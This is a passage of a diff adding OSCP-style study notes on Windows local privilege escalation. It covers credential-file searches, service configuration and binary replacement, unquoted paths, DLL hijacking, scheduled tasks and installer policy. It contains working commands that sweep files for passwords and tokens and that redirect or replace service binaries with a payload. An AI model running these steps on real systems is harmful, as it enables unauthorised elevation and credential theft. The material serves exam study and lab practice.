+  Where-Object { $_.Name -match 'pass|cred|config|backup|unattend|\.env' }
+</code></pre>
+<pre><code class="language-powershell">Get-ChildItem C:\Users,C:\ProgramData,C:\inetpub -File -Recurse -ErrorAction SilentlyContinue |
+  Where-Object { $_.Extension -in '.config','.xml','.ini','.txt','.ps1','.bat','.cmd' } |
+  Select-String -Pattern 'password|passwd|secret|token|connectionString' -CaseSensitive:$false
+</code></pre>
+<p>Avoid searching the entire filesystem without a reason; scope reduces noise, access errors and sensitive-data overcollection.</p>
+<h3 id="7-worked-example--hypothetical-2">7. Worked example — hypothetical</h3>
+<p>Observation: a history file contains a service password. Test: identify its account scope and compatible service. Illustrative output: the password grants a remote share but not local elevation. Interpretation: re-enumerate that share and preserve identity context.</p>
+<h3 id="8-verify-the-result-2">8. Verify the result</h3>
+<p>Tie each value to a source/account/service and verify any new token with whoami /all.</p>
+<h3 id="9-failure-and-fallback-2">9. Failure and fallback</h3>
+<p>Protected blobs, stale history and saved credentials for a different target require their own keys/context or a different route.</p>
+<h3 id="10-next-transitions-2">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/credentials/#credential-classify">Classify the artifact and its identity context</a>; <a href="/oscp/notes/methods/credentials/#credential-use">Validate known passwords and context-specific reuse</a>; <a href="/oscp/notes/methods/ad-identities/#ad-dpapi">Use Credential Manager and DPAPI with the protecting context</a>.</p>
+<p><a id="windows-service-config"></a></p>
+<h2 id="change-a-privileged-services-executable-configuration">Change a privileged service's executable configuration</h2>
+<p><strong>Blocks:</strong> 9. <a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/#inventory-and-inspect">Operational procedure</a> | <a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/#modifiable-service-configuration">Operational procedure</a> | <a href="/oscp/cheatsheets/windows-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-3">1. Purpose and result</h3>
+<p>Verified execution under the configured service identity.</p>
+<h3 id="2-recognition-clues-3">2. Recognition clues</h3>
+<p>Effective SERVICE_CHANGE_CONFIG on a higher-privileged service.</p>
+<h4 id="find-the-clue-from-your-starting-access-3">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Inventory service accounts/paths, select a higher-identity service and query its effective service-object rights with the current token.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-powershell">Get-CimInstance Win32_Service | Select-Object Name,StartName,State,PathName
+sc.exe qc SERVICE
+accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">SERVICE_START_NAME: LocalSystem
+Effective service rights:
+  SERVICE_CHANGE_CONFIG
+  SERVICE_START
+</code></pre>
+<p><strong>Recognize this detail:</strong> Configuration-change and start rights on the same higher-identity service are promising; file ACLs alone would not prove them.</p>
+<p><strong>Still missing before method selection:</strong> Use sc qc to read the service account and command, sc sdshow/AccessChk to verify configuration rights and sc query to inspect state. Confirm an allowed start/restart trigger before changing the service, then verify whoami.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The controlled configuration is consumed at a usable trigger and effect is verified: choose service configuration abuse.</td></tr><tr><td>Ruled out in this context</td><td>Only query rights are granted: reject the ability to change binPath.</td></tr><tr><td>Inconclusive</td><td>CHANGE_CONFIG without a usable trigger remains an incomplete candidate.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/windows-privesc/#windows-state">Establish Windows token, host and process context</a>.</p>
+<h3 id="3-prerequisites-3">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Windows foothold with a known token, integrity level and groups. <strong>Required conditions:</strong> Configuration-change right, accessible compatible payload path and a separate start/restart trigger.</p>
+<h3 id="4-discover-and-verify-prerequisites-3">4. Discover and verify prerequisites</h3>
+<pre><code class="language-cmd">sc.exe qc SERVICE
+sc.exe sdshow SERVICE
+icacls "C:\Windows\Temp"
+</code></pre>
+<h3 id="5-why-it-works-3">5. Why it works</h3>
+<p>Service configuration and service start/stop are separate permissions. An ordinary program can execute and still return service error 1053 because it does not implement the service protocol.</p>
+<h3 id="6-execute-and-choose-variants-3">6. Execute and choose variants</h3>
+<pre><code class="language-powershell">Get-CimInstance Win32_Service | Select-Object Name,StartName,State,StartMode,PathName
+</code></pre>
+<pre><code class="language-cmd">sc.exe qc SERVICE
+sc.exe sdshow SERVICE
+icacls "C:\Path\To\service.exe"
+icacls "C:\Path\To"
+accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE
+accesschk.exe -accepteula -nobanner -v -w "USER" "C:\Path\To\service.exe"
+</code></pre>
+<blockquote>
+<p><strong>Need:</strong> control of service config, exact binary/script, searched prefix, DLL/config/plugin, or relevant DACL; higher <code>SERVICE_START_NAME</code>; and a start/restart/boot trigger. In PowerShell use <code>sc.exe</code>, because bare <code>sc</code> can resolve to <code>Set-Content</code>.</p>
+</blockquote>
+<p>Preserve <code>BINARY_PATH_NAME</code>, account and start mode first:</p>
+<pre><code class="language-cmd">sc.exe qc SERVICE
+sc.exe config SERVICE binPath= "C:\Windows\Temp\PAYLOAD_EXE"
+sc.exe stop SERVICE
+sc.exe start SERVICE
+</code></pre>
+<p>Restore:</p>
+<pre><code class="language-cmd">sc.exe config SERVICE binPath= "ORIGINAL_BINARY_PATH"
+</code></pre>
+<blockquote>
+<p><code>SERVICE_CHANGE_CONFIG</code> controls <code>binPath</code>; start/stop are separate rights. The space after <code>binPath=</code> is required. Error 1053 may mean a non-service payload ran but did not answer the Service Control Manager; verify the intended effect.</p>
+</blockquote>
+<details>
+<summary><strong>Writable service binary or replaceable parent</strong></summary>
+<pre><code class="language-cmd">sc.exe qc SERVICE
+icacls "C:\Path\To\service.exe"
+icacls "C:\Path\To"
+copy /Y "C:\Path\To\service.exe" "C:\Windows\Temp\service.exe.backup"
+copy /Y "C:\Windows\Temp\PAYLOAD_EXE" "C:\Path\To\service.exe"
+sc.exe stop SERVICE
+sc.exe start SERVICE
+</code></pre>
+<blockquote>
+<p>A parent with delete/create rights can permit replacement even when the file is not directly writable. Confirm architecture, file locks, recovery copy and exact trigger.</p>
+</blockquote>
+</details>
+<h3 id="7-worked-example--hypothetical-3">7. Worked example — hypothetical</h3>
+<p>Observation: configuration changes are permitted but stop/start is denied. Test: inspect the actual service schedule/recovery trigger. Illustrative output: no usable trigger is available. Interpretation: record the control and missing condition, then prioritize another path.</p>
+<h3 id="8-verify-the-result-3">8. Verify the result</h3>
+<p>Verify the payload's effect and service execution identity, then restore the saved configuration.</p>
+<h3 id="9-failure-and-fallback-3">9. Failure and fallback</h3>
+<p>Access denied on config is different from trigger denial or an incompatible binary. Preserve original binPath and use sc.exe explicitly in PowerShell.</p>
+<h3 id="10-next-transitions-3">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/sessions-transfers/#session-windows">Use Windows authenticated access or a PowerShell command channel</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-state">Establish Windows token, host and process context</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-tasks">Control scheduled tasks, startup files or autostart consumers</a>.</p>
+<p><a id="windows-service-binary"></a></p>
+<h2 id="replace-a-privileged-service-binary-or-consumed-file">Replace a privileged service binary or consumed file</h2>
+<p><strong>Blocks:</strong> 9. <a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/">Operational procedure</a> | <a href="/oscp/cheatsheets/windows-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-4">1. Purpose and result</h3>
+<p>Verified execution of the replacement under the service identity.</p>
+<h3 id="2-recognition-clues-4">2. Recognition clues</h3>
+<p>A privileged service consumes a file whose bytes or parent replacement are controllable.</p>
+<h4 id="find-the-clue-from-your-starting-access-4">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> From service inventory follow the exact executable/script path and inspect both its own ACL and its parent's replacement rights.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-cmd">sc.exe qc SERVICE
+icacls "C:\Path\To\service.exe"
+icacls "C:\Path\To"
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">SERVICE_START_NAME: LocalSystem
+BINARY_PATH_NAME: C:\APP\service.exe
+C:\APP: DOMAIN\GROUP:(M)
+</code></pre>
+<p><strong>Recognize this detail:</strong> A higher-identity service consumes a potentially replaceable file in a modifiable directory.</p>
+<p><strong>Still missing before method selection:</strong> Use sc qc to locate the real binary and account, then icacls on that file and its parent. Confirm replacement rights and an available privileged service start/restart; a writable unrelated file is insufficient.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The replaced compatible file is actually started under the service identity: select this route.</td></tr><tr><td>Ruled out in this context</td><td>The modified directory is unrelated to the configured executable: reject this consumer assumption.</td></tr><tr><td>Inconclusive</td><td>A writable path without restart/boot evidence leaves execution unproved.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/windows-privesc/#windows-state">Establish Windows token, host and process context</a>.</p>
+<h3 id="3-prerequisites-4">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Windows foothold with a known token, integrity level and groups. <strong>Required conditions:</strong> Effective file/parent replacement rights, compatible artifact, file-lock handling and available privileged restart/boot trigger.</p>
+<h3 id="4-discover-and-verify-prerequisites-4">4. Discover and verify prerequisites</h3>
+<pre><code class="language-cmd">sc.exe qc SERVICE
+icacls "C:\Path\To\service.exe"
+icacls "C:\Path\To"
+</code></pre>
+<h3 id="5-why-it-works-4">5. Why it works</h3>
+<p>Filesystem control can redirect service execution without permission to change the service object. The actual consumed path and service account must be confirmed.</p>
+<h3 id="6-execute-and-choose-variants-4">6. Execute and choose variants</h3>
+<details>
+<summary><strong>Writable service binary or replaceable parent</strong></summary>
+<pre><code class="language-cmd">sc.exe qc SERVICE
+icacls "C:\Path\To\service.exe"
+icacls "C:\Path\To"
+copy /Y "C:\Path\To\service.exe" "C:\Windows\Temp\service.exe.backup"
+copy /Y "C:\Windows\Temp\PAYLOAD_EXE" "C:\Path\To\service.exe"
+sc.exe stop SERVICE
+sc.exe start SERVICE
+</code></pre>
+<blockquote>
+<p>A parent with delete/create rights can permit replacement even when the file is not directly writable. Confirm architecture, file locks, recovery copy and exact trigger.</p>
+</blockquote>
+</details>
+<h3 id="7-worked-example--hypothetical-4">7. Worked example — hypothetical</h3>
+<p>Observation: a LocalSystem service binary is replaceable. Test: preserve it, verify the restart right and trigger the documented replacement. Illustrative output: the controlled effect runs as SYSTEM. Interpretation: verify the token and restore the original artifact.</p>
+<h3 id="8-verify-the-result-4">8. Verify the result</h3>
+<p>Prove actual selected file, trigger and resulting token; retain the recovery copy privately.</p>
+<h3 id="9-failure-and-fallback-4">9. Failure and fallback</h3>
+<p>File locking, read-only paths, wrong architecture or unavailable restart can block this specific route.</p>
+<h3 id="10-next-transitions-4">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/windows-privesc/#windows-state">Establish Windows token, host and process context</a>; <a href="/oscp/notes/methods/execution/#execution-format">Match an artifact to its executable consumer and runtime</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-acl">Prove effective file, registry and service-object permissions</a>.</p>
+<p><a id="windows-unquoted"></a></p>
+<h2 id="exploit-an-unquoted-service-path-with-a-writable-earlier-prefix">Exploit an unquoted service path with a writable earlier prefix</h2>
+<p><strong>Blocks:</strong> 9. <a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/#5-unquoted-service-paths">Operational procedure</a> | <a href="/oscp/cheatsheets/windows-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-5">1. Purpose and result</h3>
+<p>Verified execution of the earlier executable candidate.</p>
+<h3 id="2-recognition-clues-5">2. Recognition clues</h3>
+<p>A service command line contains unquoted spaces.</p>
+<h4 id="find-the-clue-from-your-starting-access-5">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> List service command lines and accounts, then inspect every earlier executable prefix in the actual unquoted path.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-powershell">Get-CimInstance Win32_Service | Select-Object Name,StartName,State,PathName
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">StartName: LocalSystem
+PathName: C:\Program Files\Vendor App\service.exe -d
+Quotes around executable: absent
+</code></pre>
+<p><strong>Recognize this detail:</strong> Spaces plus absent executable quoting create candidate earlier prefixes; writable placement and trigger remain unproved.</p>
+<p><strong>Still missing before method selection:</strong> Read the unquoted service command with sc qc. Check each earlier executable prefix for write/create access with icacls; confirm the service account and restart trigger. Spaces alone do not make the path exploitable.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>A usable earlier prefix is selected at a privileged trigger: choose this parsing route.</td></tr><tr><td>Ruled out in this context</td><td>All earlier prefixes are protected, already occupied or the executable is correctly quoted: reject it.</td></tr><tr><td>Inconclusive</td><td>A scanner flag without prefix/trigger checks leaves exploitability unknown.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/windows-privesc/#windows-state">Establish Windows token, host and process context</a>.</p>
+<h3 id="3-prerequisites-5">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Windows foothold with a known token, integrity level and groups. <strong>Required conditions:</strong> An earlier executable prefix is absent and creatable, service identity is higher and a start/restart trigger exists.</p>
+<h3 id="4-discover-and-verify-prerequisites-5">4. Discover and verify prerequisites</h3>
+<pre><code class="language-powershell">Get-CimInstance Win32_Service | Select-Object Name,StartName,PathName
+</code></pre>
+<h3 id="5-why-it-works-5">5. Why it works</h3>
+<p>Windows executable-path parsing may try earlier space-separated prefixes. Spaces alone do not create control; each attempted prefix and its creation rights matter.</p>
+<h3 id="6-execute-and-choose-variants-5">6. Execute and choose variants</h3>
+<pre><code class="language-powershell">Get-CimInstance Win32_Service |
+  Where-Object { $_.PathName -match '\s' -and $_.PathName -notmatch '^\s*"' } |
+  Select-Object Name,StartName,State,StartMode,PathName
+</code></pre>
+<p>For <code>C:\Program Files\Vendor App\service.exe -d</code>, check every attempted prefix:</p>
+<pre><code class="language-cmd">icacls C:\
+icacls "C:\Program Files"
+icacls "C:\Program Files\Vendor App"
+sc.exe qc SERVICE
+</code></pre>
+<blockquote>
+<p><strong>Confirmed only if:</strong> path contains spaces and is unquoted; an earlier attempted executable such as <code>C:\Program.exe</code> or <code>C:\Program Files\Vendor.exe</code> is absent and creatable; service runs higher; trigger exists. A listed unquoted path alone is a false positive.</p>
+</blockquote>
+<h3 id="7-worked-example--hypothetical-5">7. Worked example — hypothetical</h3>
+<p>Observation: a service uses an unquoted Program Files path. Test: inspect each attempted prefix and its directory ACL. Illustrative output: all earlier prefixes are protected. Interpretation: this is not an exploitable path under the current identity.</p>
+<h3 id="8-verify-the-result-5">8. Verify the result</h3>
+<p>Confirm the earlier prefix is actually selected after the trigger and verify its resulting token.</p>
+<h3 id="9-failure-and-fallback-5">9. Failure and fallback</h3>
+<p>A quoted path, existing protected earlier file, unwritable directory or absent trigger defeats the chain.</p>
+<h3 id="10-next-transitions-5">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/windows-privesc/#windows-acl">Prove effective file, registry and service-object permissions</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-service-binary">Replace a privileged service binary or consumed file</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-state">Establish Windows token, host and process context</a>.</p>
+<p><a id="windows-dll"></a></p>
+<h2 id="control-a-privileged-dll-helper-or-configuration-load">Control a privileged DLL, helper or configuration load</h2>
+<p><strong>Blocks:</strong> 9. <a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/#6-dllconfighelper-search-hijacking">Operational procedure</a> | <a href="/oscp/cheatsheets/windows-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-6">1. Purpose and result</h3>
+<p>Verified privileged consumption of the chosen dependency.</p>
+<h3 id="2-recognition-clues-6">2. Recognition clues</h3>
+<p>A privileged application searches for a missing dependency or consumes writable configuration.</p>
+<h4 id="find-the-clue-from-your-starting-access-6">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Investigate a privileged application with observed dependency failures; if permitted, filter its runtime file loads in Procmon before checking candidate directory ACLs.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-text">Procmon, when accessible: filter the actual process; inspect requested .dll paths and NAME NOT FOUND results.
+Record the exact requested filename and every searched location.
+Then inspect the selected location's effective ACL with the owning procedure.
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">PROCESS CreateFile C:\SEARCH_PATH\missing.dll NAME NOT FOUND
+Privilege and selected search order: not yet verified
+</code></pre>
+<p><strong>Recognize this detail:</strong> An actual requested missing dependency is stronger than guessing a DLL name, but does not prove an attacker-controlled resolution wins.</p>
+<p><strong>Still missing before method selection:</strong> Validate real privilege, search precedence/KnownDLLs/manifests, directory control, ABI/exports and a load trigger.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The privileged process selects the controlled compatible dependency: choose that load route.</td></tr><tr><td>Ruled out in this context</td><td>A trusted manifest/earlier location resolves it before the writable directory: reject that path.</td></tr><tr><td>Inconclusive</td><td>No runtime visibility leaves loading behavior unresolved; retain it as a candidate rather than declaring hijack success.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/windows-privesc/#windows-state">Establish Windows token, host and process context</a>.</p>
+<h3 id="3-prerequisites-6">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Windows foothold with a known token, integrity level and groups. <strong>Required conditions:</strong> Actual controlled resolution path, compatible name/architecture/exports and a reliable privileged load trigger.</p>
+<h3 id="4-discover-and-verify-prerequisites-6">4. Discover and verify prerequisites</h3>
+<pre><code class="language-cmd">icacls "C:\Path\To\Application"
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"
+</code></pre>
+<h3 id="5-why-it-works-6">5. Why it works</h3>
+<p>DLL loading can involve KnownDLLs, manifests, redirection, packages and explicit search flags before ordinary directories. A missing DLL name or writable directory alone does not establish selection.</p>
+<h3 id="6-execute-and-choose-variants-6">6. Execute and choose variants</h3>
+<p>Confirm:</p>
+<ol>
+<li>exact DLL/helper/config name and architecture;</li>
+<li>privileged process actually requests it;</li>
+<li>selected attacker-writable location precedes the legitimate resolution;</li>
+<li>payload preserves required exports/behavior where necessary;</li>
+<li>reliable trigger exists.</li>
+</ol>
+<pre><code class="language-cmd">icacls "C:\Path\To\Application"
+sc.exe qc SERVICE
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v SafeDllSearchMode
+</code></pre>
+<blockquote>
+<p>Modern DLL resolution can apply redirection, API sets, side-by-side manifests, loaded modules, KnownDLLs, package dependencies and application-specific search flags before ordinary directories. Safe DLL search mode is enabled by default. In a suitable lab, Procmon filters for the process, <code>CreateFile</code>, <code>.dll</code>, and <code>NAME NOT FOUND</code> provide decisive runtime evidence; low-privilege remote use may be unavailable.</p>
+</blockquote>
+<h3 id="7-worked-example--hypothetical-6">7. Worked example — hypothetical</h3>
+<p>Observation: runtime evidence shows a privileged process requests a missing DLL. Test: verify the effective search order and writable candidate location. Illustrative output: a trusted manifest redirects the load elsewhere. Interpretation: reject that candidate and inspect another dependency.</p>
+<h3 id="8-verify-the-result-6">8. Verify the result</h3>
+<p>Verify the actual loaded path and privileged effect; a file placed on disk is not a completed chain.</p>
+<h3 id="9-failure-and-fallback-6">9. Failure and fallback</h3>
+<p>Wrong ABI/exports, earlier trusted resolution or no load trigger blocks the method.</p>
+<h3 id="10-next-transitions-6">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/public-exploits/#exploit-compile">Compile and minimally adapt an existing native or memory-corruption PoC</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-acl">Prove effective file, registry and service-object permissions</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-state">Establish Windows token, host and process context</a>.</p>
+<p><a id="windows-tasks"></a></p>
+<h2 id="control-scheduled-tasks-startup-files-or-autostart-consumers">Control scheduled tasks, startup files or autostart consumers</h2>
+<p><strong>Blocks:</strong> 9. <a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/#7-scheduled-tasks-and-autostarts">Operational procedure</a> | <a href="/oscp/cheatsheets/windows-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-7">1. Purpose and result</h3>
+<p>Verified privileged task or startup execution.</p>
+<h3 id="2-recognition-clues-7">2. Recognition clues</h3>
+<p>A task/startup action consumes a writable command, file, directory or registry value.</p>
+<h4 id="find-the-clue-from-your-starting-access-7">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Enumerate task definitions and inspect the action, principal, arguments and working directory before permission-checking its files.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-cmd">schtasks /query /fo LIST /v
+schtasks /query /tn "\FOLDER\TASK" /xml
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Principal: SYSTEM
+Action: powershell.exe -File C:\APP\job.ps1
+Trigger: scheduled
+File control: inspect separately
+</code></pre>
+<p><strong>Recognize this detail:</strong> A named privileged task exposes a concrete consumer and action path to investigate.</p>
+<p><strong>Still missing before method selection:</strong> Read the task's exact action, principal and trigger with schtasks or Get-ScheduledTask. Check icacls on its file/parents and prove the stronger identity will consume the controlled path at a reachable trigger.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The controllable action is consumed under the expected higher token: select the task route.</td></tr><tr><td>Ruled out in this context</td><td>The real principal is the same low user: reject assumed elevation.</td></tr><tr><td>Inconclusive</td><td>Task registration or run acceptance without process/effect evidence leaves execution unresolved.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/windows-privesc/#windows-state">Establish Windows token, host and process context</a>.</p>
+<h3 id="3-prerequisites-7">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Windows foothold with a known token, integrity level and groups. <strong>Required conditions:</strong> Effective object control, a higher principal and a usable scheduled/logon/manual trigger.</p>
+<h3 id="4-discover-and-verify-prerequisites-7">4. Discover and verify prerequisites</h3>
+<pre><code class="language-cmd">schtasks /query /fo LIST /v
+schtasks /query /tn "\FOLDER\TASK" /xml
+</code></pre>
+<h3 id="5-why-it-works-7">5. Why it works</h3>
+<p>RunLevel Highest selects the configured principal's highest available token; it does not mean SYSTEM. A writable user startup entry usually runs as that user.</p>
+<h3 id="6-execute-and-choose-variants-7">6. Execute and choose variants</h3>
+<h5 id="scheduled-tasks">Scheduled tasks</h5>
+<pre><code class="language-cmd">schtasks /query /fo LIST /v
+schtasks /query /tn "\FOLDER\TASK" /xml
+</code></pre>
+<pre><code class="language-powershell">Get-ScheduledTask | ForEach-Object {
+  $t = $_
+  [pscustomobject]@{
+    TaskPath=$t.TaskPath; TaskName=$t.TaskName
+    UserId=$t.Principal.UserId; RunLevel=$t.Principal.RunLevel
+    Actions=($t.Actions | ForEach-Object { "$($_.Execute) $($_.Arguments) [wd=$($_.WorkingDirectory)]" }) -join '; '
+  }
+}
+</code></pre>
+<pre><code class="language-cmd">icacls "C:\Path\To\task-script.ps1"
+icacls "C:\Path\To"
+schtasks /run /tn "\FOLDER\TASK"
+</code></pre>
+<blockquote>
+<p>Prove action, arguments, working directory, principal, actual trigger and effective ACL. <code>RunLevel Highest</code> means the configured principal's highest available token, not SYSTEM. <code>/run</code> success means the request was accepted; verify process/effect and last-run result.</p>
+</blockquote>
+<details>
+<summary><strong>Run keys and startup consumers</strong></summary>
+<pre><code class="language-cmd">reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+</code></pre>
+<blockquote>
+<p>Need a modifiable consumed value/file plus a higher-privileged boot/logon/application trigger. A writable PATH directory matters only when a privileged consumer invokes an unqualified executable through that effective PATH.</p>
+</blockquote>
+</details>
+<h3 id="7-worked-example--hypothetical-7">7. Worked example — hypothetical</h3>
+<p>Observation: a writable script is named in a scheduled task. Test: inspect principal, arguments, working directory and trigger. Illustrative output: the task runs as the same low user. Interpretation: it is not a local privilege escalation under that configuration.</p>
+<h3 id="8-verify-the-result-7">8. Verify the result</h3>
+<p>Check the actual effect and token after the trigger; task-run acceptance alone is insufficient.</p>
+<h3 id="9-failure-and-fallback-7">9. Failure and fallback</h3>
+<p>Wrong principal, stale action, denied trigger or a different working directory can invalidate the candidate.</p>
+<h3 id="10-next-transitions-7">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/windows-privesc/#windows-acl">Prove effective file, registry and service-object permissions</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-state">Establish Windows token, host and process context</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-service-config">Change a privileged service's executable configuration</a>.</p>
+<p><a id="windows-installer"></a></p>
+<h2 id="validate-elevated-installer-policy-and-administrative-token-context">Validate elevated installer policy and administrative-token context</h2>
+<p><strong>Blocks:</strong> 9. <a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/#8-alwaysinstallelevated-and-uac-context">Operational procedure</a> | <a href="/oscp/cheatsheets/windows-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-8">1. Purpose and result</h3>
+<p>A verified installer-policy execution route or a precise token-boundary assessment.</p>
+<h3 id="2-recognition-clues-8">2. Recognition clues</h3>
+<p>Installer policy values or an administrator account with a filtered token.</p>
+<h4 id="find-the-clue-from-your-starting-access-8">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Inspect both machine/user installer-policy values and the current token before inferring an elevated MSI or UAC-context route.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-cmd">reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+whoami /all
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">HKLM AlwaysInstallElevated REG_DWORD 0x1
+HKCU AlwaysInstallElevated: value not found
+</code></pre>
+<p><strong>Recognize this detail:</strong> One policy value is insufficient; the two-policy conjunction is the key recognition condition.</p>
+<p><strong>Still missing before method selection:</strong> For installer execution verify both applicable values and permitted MSI/runtime; assess UAC administrator/token prerequisites separately.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>Both required policies and a compatible permitted installer consumer exist: validate that route's effect.</td></tr><tr><td>Ruled out in this context</td><td>The required user policy is absent/disabled: reject this elevated-installer method.</td></tr><tr><td>Inconclusive</td><td>Policy visibility failure or unknown effective context requires another check.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/windows-privesc/#windows-state">Establish Windows token, host and process context</a>.</p>
+<h3 id="3-prerequisites-8">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Windows foothold with a known token, integrity level and groups. <strong>Required conditions:</strong> AlwaysInstallElevated requires both effective machine/user policy values and permitted MSI execution; UAC routes require their own compatible administrator/token context.</p>
+<h3 id="4-discover-and-verify-prerequisites-8">4. Discover and verify prerequisites</h3>
+<pre><code class="language-cmd">reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+whoami /all
+</code></pre>
+<h3 id="5-why-it-works-8">5. Why it works</h3>
+<p>Both installer policies must enable the feature. UAC elevation and standard-user-to-administrator escalation have different prerequisites; a token/consent mechanism is not a universal boundary bypass.</p>
+<h3 id="6-execute-and-choose-variants-8">6. Execute and choose variants</h3>
+<pre><code class="language-cmd">reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
